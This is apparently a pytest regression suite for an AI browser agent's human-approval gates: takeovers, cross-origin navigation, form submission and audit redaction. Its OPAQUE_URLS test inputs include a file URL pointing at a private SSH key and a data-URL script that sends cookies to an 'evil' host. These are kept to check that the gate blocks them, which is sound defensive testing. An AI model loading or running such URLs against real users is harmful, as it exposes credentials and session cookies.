"""Regression tests for the human-in-the-loop gates.

Each test names a hole it keeps shut: a takeover that used to raise instead of
returning an envelope, or a form submission that used to slip past the approval
gate through a door other than ``click()``.

A gate has two halves — returning the right envelope *and* leaving the page
untouched — so these assert on ``page.calls`` as well as on status.
"""

from __future__ import annotations

import json

import pytest

from conftest import FakeDialog
from lyra_browser.origin import parse_origin
from lyra_browser.permission import Capability

# Every tool that mutates the shared window, with arguments that are otherwise
# ungated. If a new mutating tool is added it belongs here.
MUTATING_TOOLS = {
    "navigate": {"url": "https://start.example/next"},
    "go_back": {},
    "reload_page": {},
    "click": {"selector": "#plain"},
    "type_text": {"selector": "#field", "value": "text"},
    "press_key": {"key": "Escape"},
    "hover": {"selector": "#menu"},
    "scroll": {"to": "bottom"},
    "select_option": {"selector": "#plain", "value": "1"},
    "set_editor": {"content": "text"},
    "upload_file": {"selector": "#file", "paths": ["/nonexistent"]},
    "publish": {"selector": "#publish", "submit": "#send"},
    "save_draft": {"submit": "#send"},
    # Changes no page state, but it decides what the next action's dialog gets
    # answered with, so it stands down for a takeover like the rest.
    "handle_dialog": {"accept": True},
    "tabs": {"action": "close", "index": 0},
    "close_browser": {},
    # Collaboration tools look like reads but move the viewport and inject styles
    # the context is attended, otherwise they answer `unattended`
    # before the takeover check is ever reached.
    "highlight_element": {"selector": "#plain"},
    "ask_user_to_do": {"instruction": "check the form"},
}


# --------------------------------------------------------------------------
# Takeover: every mutating tool must answer with an envelope, never an exception
# --------------------------------------------------------------------------


@pytest.mark.parametrize(("name", "kwargs"), sorted(MUTATING_TOOLS.items()))
async def test_every_mutating_tool_yields_takeover_envelope(make_ctx, tools_of, page, name, kwargs):
    ctx = make_ctx()
    ctx.collab.takeover = True
    ctx.collab.takeover_reason = "user is driving"
    tools = await tools_of(ctx)

    result = await tools[name](**kwargs)

    assert result["status"] == "takeover_active"
    assert page.calls == [], f"{name} touched the page during a takeover"


async def test_handle_dialog_during_a_takeover_arms_nothing(make_ctx, tools_of, page):
    """The envelope is half of it: nothing may be left armed behind it for later."""
    ctx = make_ctx()
    ctx.collab.takeover = True
    tools = await tools_of(ctx)

    refused = await tools["handle_dialog"](accept=True)
    ctx.collab.takeover = False
    page.dialogs_on_click = [FakeDialog("Delete it?", type="confirm")]
    clicked = await tools["click"](selector="#plain")

    assert refused["status"] == "takeover_active"
    assert page.raised_dialogs[0].answers == [("dismiss",)]
    assert clicked["dialogs"][0]["armed"] is False


async def test_read_tools_stay_available_during_takeover(make_ctx, tools_of):
    ctx = make_ctx()
    ctx.collab.takeover = True
    tools = await tools_of(ctx)

    assert (await tools["get_url"]())["url"] == "https://start.example/"
    assert (await tools["read_page"]())["text"] == "page text"
    assert (await tools["screenshot"]())["status"] == "ok"


# --------------------------------------------------------------------------
# navigate: cross-origin approval
# --------------------------------------------------------------------------


async def test_navigate_gates_cross_site(make_ctx, tools_of, page):
    tools = await tools_of(make_ctx())

    result = await tools["navigate"](url="https://other.example/")

    assert result["status"] == "needs_approval"
    assert result["action"] == "navigate"
    assert page.calls == []


async def test_navigate_proceeds_with_confirm(make_ctx, tools_of, page):
    tools = await tools_of(make_ctx())

    result = await tools["navigate"](url="https://other.example/", confirm=True)

    assert result["status"] == "ok"
    assert ("goto", "https://other.example/") in page.calls


# URLs with no authority. Each one used to reach page.goto() with no gate at all,
# because the old hostname check went falsy on them (vulnerability #9).
OPAQUE_URLS = [
    "file:///Users/unohee/.ssh/id_rsa",
    "data:text/html,<script>fetch('//evil/'+document.cookie)</script>",
    "javascript:alert(1)",
    "about:blank",
    "view-source:https://start.example/",
]


@pytest.mark.parametrize("url", OPAQUE_URLS)
async def test_navigate_gates_authority_less_urls(make_ctx, tools_of, page, url):
    tools = await tools_of(make_ctx())

    result = await tools["navigate"](url=url)

    assert result["status"] == "needs_approval"
    assert page.calls == [], f"{url} reached the page without approval"


async def test_navigate_gates_scheme_downgrade(make_ctx, tools_of, page):
    """https -> http on the same host is leaving the site, not staying on it."""
    tools = await tools_of(make_ctx())  # page starts on https://start.example/

    result = await tools["navigate"](url="http://start.example/")

    assert result["status"] == "needs_approval"
    assert page.calls == []


async def test_navigate_records_origin_and_initiator(make_ctx, tools_of):
    ctx = make_ctx()
    tools = await tools_of(ctx)

    await tools["navigate"](url="https://other.example/", confirm=True)

    entry = json.loads(ctx.config.audit_path.read_text().splitlines()[-1])
    assert entry["origin"] == "https://other.example"
    assert entry["initiator"] == "https://start.example"


async def test_navigate_same_host_is_ungated(make_ctx, tools_of, page):
    tools = await tools_of(make_ctx())

    result = await tools["navigate"](url="https://start.example/deeper")

    assert result["status"] == "ok"
    assert ("goto", "https://start.example/deeper") in page.calls


# --------------------------------------------------------------------------
# type_text: submitting by Enter is a submission and must be gated like one
# --------------------------------------------------------------------------


async def test_type_text_submit_requires_confirm(make_ctx, tools_of, page):
    tools = await tools_of(make_ctx())

    result = await tools["type_text"](selector="#q", value="hello", submit=True)

    assert result["status"] == "needs_approval"
    # Nothing was filled: a gated call must not leave a half-applied form behind.
    assert page.calls == []


async def test_type_text_submit_proceeds_with_confirm(make_ctx, tools_of, page):
    tools = await tools_of(make_ctx())

    result = await tools["type_text"](selector="#q", value="hello", submit=True, confirm=True)

    assert result["status"] == "ok"
    assert ("fill", "#q", "hello") in page.calls
    assert ("press", "#q", "Enter") in page.calls


async def test_type_text_without_submit_is_ungated(make_ctx, tools_of, page):
    tools = await tools_of(make_ctx())

    result = await tools["type_text"](selector="#q", value="hello")

    assert result["status"] == "ok"
    assert ("fill", "#q", "hello") in page.calls
    assert ("press", "#q", "Enter") not in page.calls


async def test_gated_type_text_still_redacts_the_value(make_ctx, tools_of):
    ctx = make_ctx()
    tools = await tools_of(ctx)

    await tools["type_text"](selector="#pw", value="hunter2", submit=True)

    log = ctx.config.audit_path.read_text()
    assert "hunter2" not in log
    assert "needs_approval" in log


# --------------------------------------------------------------------------
# press_key: Enter submits the focused form
# --------------------------------------------------------------------------


# --------------------------------------------------------------------------
# No key and no element is special any more. A tool declares what it intends;
# what actually leaves the browser is judged by the enforcement layer.
# --------------------------------------------------------------------------


@pytest.mark.parametrize("key", ["Enter", "NumpadEnter", "Control+Enter", " ", "Space", "Escape"])
async def test_no_keystroke_is_treated_as_special(make_ctx, tools_of, page, key):
    """Enter and Space used to be a list to maintain; Space was missing from it.

    Now nothing is on a list: pressing a key needs permission to interact, and a
    submission it causes is stopped at the request instead of at the key name.
    """
    tools = await tools_of(make_ctx())  # already on the site

    result = await tools["press_key"](key=key)

    assert result["status"] == "ok"
    assert ("key", key) in page.calls


async def test_click_does_not_inspect_the_element(make_ctx, tools_of, page):
    """A submit-looking control is no longer detected — and no longer needs to be."""
    page.attributes = {"type": "submit"}
    page.is_form_button = True
    tools = await tools_of(make_ctx())

    result = await tools["click"](selector="#go")

    assert result["status"] == "ok"
    assert ("click", "#go") in page.calls


# --------------------------------------------------------------------------
# Declaring a submission buys the scope for it
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("tool", "kwargs"),
    [
        ("click", {"selector": "#go", "submits": True}),
        ("press_key", {"key": "Enter", "submits": True}),
        ("type_text", {"selector": "#q", "value": "v", "submit": True}),
    ],
)
async def test_declared_submission_needs_approval(make_ctx, tools_of, page, tool, kwargs):
    tools = await tools_of(make_ctx())

    result = await tools[tool](**kwargs)

    assert result["status"] == "needs_approval"
    assert page.calls == []


@pytest.mark.parametrize(
    ("tool", "kwargs"),
    [
        ("click", {"selector": "#go", "submits": True}),
        ("press_key", {"key": "Enter", "submits": True}),
        ("type_text", {"selector": "#q", "value": "v", "submit": True}),
    ],
)
async def test_declared_submission_proceeds_with_confirm(make_ctx, tools_of, page, tool, kwargs):
    tools = await tools_of(make_ctx())

    result = await tools[tool](**kwargs, confirm=True)

    assert result["status"] == "ok"
    assert page.calls != []


async def test_interacting_does_not_quietly_include_submitting(make_ctx, tools_of):
    """Being on a site lets you use it. It must not also let you send forms."""
    ctx = make_ctx()
    tools = await tools_of(ctx)

    await tools["click"](selector="#anything")

    site = parse_origin("https://start.example/")
    assert ctx.perms.check("default", site, Capability.INTERACT)
    assert not ctx.perms.check("default", site, Capability.SUBMIT)


async def test_submit_approval_is_spent_once(make_ctx, tools_of):
    """Approving one submission must not approve the next one."""
    ctx = make_ctx()
    tools = await tools_of(ctx)

    assert (await tools["click"](selector="#go", submits=True, confirm=True))["status"] == "ok"
    site = parse_origin("https://start.example/")
    assert not ctx.perms.check("default", site, Capability.SUBMIT)


# --------------------------------------------------------------------------
# The gate is opt-out, and opting out must open every door at once
# --------------------------------------------------------------------------


async def test_gates_are_noop_when_approval_disabled(make_ctx, tools_of, page):
    tools = await tools_of(make_ctx(require_approval=False))
    page.attributes = {"type": "submit"}

    assert (await tools["navigate"](url="https://other.example/"))["status"] == "ok"
    assert (await tools["type_text"](selector="#q", value="v", submit=True))["status"] == "ok"
    assert (await tools["press_key"](key="Enter"))["status"] == "ok"
    assert (await tools["click"](selector="#go"))["status"] == "ok"


# --------------------------------------------------------------------------
# hover / scroll act on the page, so they need the same INTERACT lease click does
# --------------------------------------------------------------------------

MOTION_CALLS = [
    ("hover", {"selector": "#menu"}),
    ("scroll", {"to": "bottom"}),
    ("scroll", {"by_y": 400}),
    ("scroll", {"selector": "#footer"}),
]


@pytest.mark.parametrize(("tool", "kwargs"), MOTION_CALLS)
async def test_motion_tools_ask_before_touching_an_unapproved_site(
    make_ctx, tools_of, page, tool, kwargs
):
    tools = await tools_of(make_ctx(on_site=False))

    result = await tools[tool](**kwargs)

    assert result["status"] == "needs_approval"
    assert result["action"] == tool
    assert page.calls == []


@pytest.mark.parametrize(("tool", "kwargs"), MOTION_CALLS)
async def test_motion_tools_proceed_with_confirm(make_ctx, tools_of, page, tool, kwargs):
    tools = await tools_of(make_ctx(on_site=False))

    result = await tools[tool](**kwargs, confirm=True)

    assert result["status"] == "ok"
    assert page.calls != []
